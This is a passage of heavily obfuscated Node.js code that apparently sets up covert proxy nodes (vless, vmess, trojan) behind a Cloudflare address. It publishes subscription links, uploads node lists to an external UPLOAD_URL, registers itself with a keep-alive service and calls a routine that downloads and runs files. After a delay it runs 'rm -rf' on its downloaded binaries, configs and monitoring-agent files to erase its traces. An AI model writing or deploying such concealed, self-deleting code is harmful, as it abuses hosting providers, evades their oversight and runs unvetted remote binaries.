axios['get'](_0x58ff41(0x221),{'timeout':0xbb8});if(_0x26b9c0['data']&&_0x26b9c0[_0x58ff41(_0xa0f451._0x5f3605)]['status']==='success'&&_0x26b9c0[_0x58ff41(0x225)]['countryCode']&&_0x26b9c0['data'][_0x58ff41(0x21d)])return _0x26b9c0[_0x58ff41(0x225)][_0x58ff41(_0xa0f451._0x466241)]+'_'+_0x26b9c0[_0x58ff41(_0xa0f451._0x5f3605)][_0x58ff41(0x21d)];}catch(_0xacae66){}}return _0x58ff41(0x263);}async function _0x3d008b(_0x58622c){const _0x218a5c={_0x49e2c5:0x252,_0x30a4af:0x20a,_0x3ca3c8:0x20e,_0x1c512e:0x231,_0x12e13d:0x1b3,_0x3bbc1b:0x24e,_0x40d3f5:0x1c2,_0x11ee3b:0x25a,_0x40eca1:0x1e0},_0xeec64=await _0x3c2206(),_0xf90b45=NAME?NAME+'-'+_0xeec64:_0xeec64;return new Promise(_0x11c33c=>{setTimeout(()=>{const _0x42d5ff={_0x1acddc:0x248,_0x2a46d0:0x1e3},_0x21e090=_0x8fa4,_0x304141={'v':'2','ps':''+_0xf90b45,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x21e090(_0x218a5c._0x49e2c5),'net':'ws','type':_0x21e090(0x252),'host':_0x58622c,'path':_0x21e090(_0x218a5c._0x30a4af),'tls':_0x21e090(0x1f4),'sni':_0x58622c,'alpn':'','fp':'firefox'},_0x213918=_0x21e090(_0x218a5c._0x3ca3c8)+UUID+'@'+CFIP+':'+CFPORT+_0x21e090(0x233)+_0x58622c+'&fp=firefox&type=ws&host='+_0x58622c+_0x21e090(0x1d0)+_0xf90b45+'\x0a\x0avmess://'+Buffer[_0x21e090(0x25a)](JSON[_0x21e090(_0x218a5c._0x1c512e)](_0x304141))['toString'](_0x21e090(0x1e0))+_0x21e090(0x1cc)+UUID+'@'+CFIP+':'+CFPORT+_0x21e090(_0x218a5c._0x12e13d)+_0x58622c+_0x21e090(_0x218a5c._0x3bbc1b)+_0x58622c+_0x21e090(0x232)+_0xf90b45+_0x21e090(_0x218a5c._0x40d3f5);console[_0x21e090(0x1b6)](Buffer['from'](_0x213918)['toString'](_0x21e090(0x1e0))),fs[_0x21e090(0x1c8)](subPath,Buffer[_0x21e090(_0x218a5c._0x11ee3b)](_0x213918)[_0x21e090(0x248)](_0x21e090(_0x218a5c._0x40eca1))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x21e090(0x1f1)]('/'+SUB_PATH,(_0x2a796a,_0x370733)=>{const _0x3fabdd=_0x21e090,_0x4d013d=Buffer['from'](_0x213918)[_0x3fabdd(_0x42d5ff._0x1acddc)](_0x3fabdd(0x1e0));_0x370733[_0x3fabdd(_0x42d5ff._0x2a46d0)]('Content-Type',_0x3fabdd(0x22d)),_0x370733[_0x3fabdd(0x1b9)](_0x4d013d);}),_0x11c33c(_0x213918);},0x7d0);});}}async function uploadNodes(){const _0x21f07b={_0x1287c1:0x213,_0x5abc81:0x1db,_0x24625c:0x1b6,_0x4d4db6:0x24b,_0x499acd:0x243,_0x56fb33:0x255,_0x930f4f:0x1db,_0xa43b39:0x243,_0x5cc933:0x1e8},_0x3003b3=_0x2a0465;if(UPLOAD_URL&&PROJECT_URL){const _0x5da6d1=PROJECT_URL+'/'+SUB_PATH,_0x5d928b={'subscription':[_0x5da6d1]};try{const _0x2ea358=await axios[_0x3003b3(0x1e2)](UPLOAD_URL+_0x3003b3(_0x21f07b._0x1287c1),_0x5d928b,{'headers':{'Content-Type':_0x3003b3(_0x21f07b._0x5abc81)}});return _0x2ea358&&_0x2ea358['status']===0xc8?(console[_0x3003b3(_0x21f07b._0x24625c)](_0x3003b3(0x22b)),_0x2ea358):null;}catch(_0x5d2136){if(_0x5d2136['response']){if(_0x5d2136[_0x3003b3(_0x21f07b._0x4d4db6)][_0x3003b3(_0x21f07b._0x499acd)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x59d67a=fs['readFileSync'](listPath,'utf-8'),_0x55649e=_0x59d67a[_0x3003b3(_0x21f07b._0x56fb33)]('\x0a')[_0x3003b3(0x1b1)](_0x4cea45=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3003b3(0x223)](_0x4cea45));if(_0x55649e[_0x3003b3(0x1c0)]===0x0)return;const _0x23514a=JSON[_0x3003b3(0x231)]({'nodes':_0x55649e});try{const _0x5b3b87=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x23514a,{'headers':{'Content-Type':_0x3003b3(_0x21f07b._0x930f4f)}});return _0x5b3b87&&_0x5b3b87[_0x3003b3(_0x21f07b._0xa43b39)]===0xc8?(console['log'](_0x3003b3(_0x21f07b._0x5cc933)),_0x5b3b87):null;}catch(_0xb7a2e4){return null;}}else return;}}function cleanFiles(){const _0x20e47a={_0xa648c6:0x258,_0x54fb26:0x203,_0x191af4:0x1b2,_0x5c429d:0x235,_0x1e29e2:0x1d4},_0xfe0082={_0x1046e8:0x1b6};setTimeout(()=>{const _0xb84c9f={_0x1f61af:0x264,_0x52c83c:0x1b6},_0x5660cd=_0x8fa4,_0x536acd=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x536acd[_0x5660cd(0x258)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x536acd[_0x5660cd(_0x20e47a._0xa648c6)](phpPath);process[_0x5660cd(_0x20e47a._0x54fb26)]===_0x5660cd(_0x20e47a._0x191af4)?exec(_0x5660cd(_0x20e47a._0x5c429d)+_0x536acd[_0x5660cd(0x217)]('\x20')+'\x20>\x20nul\x202>&1',_0x531f88=>{const _0x5a110b=_0x5660cd;console[_0x5a110b(_0xb84c9f._0x1f61af)](),console[_0x5a110b(_0xb84c9f._0x52c83c)](_0x5a110b(0x24f)),console['log'](_0x5a110b(0x1ca));}):exec('rm\x20-rf\x20'+_0x536acd['join']('\x20')+_0x5660cd(_0x20e47a._0x1e29e2),_0x1f10d7=>{const _0x727e28=_0x5660cd;console[_0x727e28(0x264)](),console[_0x727e28(_0xfe0082._0x1046e8)](_0x727e28(0x24f)),console[_0x727e28(0x1b6)](_0x727e28(0x1ca));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x410d27={_0x96f8e9:0x261,_0x26dd19:0x1b6,_0x5a0551:0x1d9},_0x150c17=_0x2a0465;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x150c17(0x1b6)](_0x150c17(0x20d));return;}try{const _0x102176=await axios[_0x150c17(0x1e2)](_0x150c17(_0x410d27._0x96f8e9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x150c17(0x1db)}});return console[_0x150c17(_0x410d27._0x26dd19)](_0x150c17(0x1fd)),_0x102176;}catch(_0x4f55f7){return console[_0x150c17(_0x410d27._0x5a0551)](_0x150c17(0x21c)+_0x4f55f7[_0x150c17(0x1f5)]),null;}}async function startserver(){const _0x58fca0={_0x567add:0x1d9},_0x30cb8e=_0x2a0465;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x20d3f7){console[_0x30cb8e(_0x58fca0._0x567add)]('Error\x20in\x20startserver:',_0x20d3f7);}}startserver()['catch'](_0x43d54e=>{const _0x2a8697=_0x2a0465;console['error'](_0x2a8697(0x1f8),_0x43d54e);}),app[_0x2a0465(0x24c)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
